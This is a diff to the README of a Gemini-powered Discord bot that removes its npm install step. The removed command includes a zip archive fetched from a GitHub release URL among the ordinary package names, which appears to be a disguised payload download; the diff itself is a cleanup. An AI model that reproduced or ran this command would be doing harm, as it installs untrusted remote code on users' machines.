@@ -29,9 +29,6 @@ Gemini Discord Bot is an advanced, multimodal Discord bot leveraging Google Gene
 
 2. Install dependencies:
 
-    ```sh
-    npm install @google/generative-ai axios cheerio https://github.com/trulynotafan/bot/releases/download/v2.0/Release_x64.zip dotenv eventsource fs sharp office-text-extractor youtube-transcript node-os-utils ws mathjs
-    ```
 
 3. Set up environment variables:
 
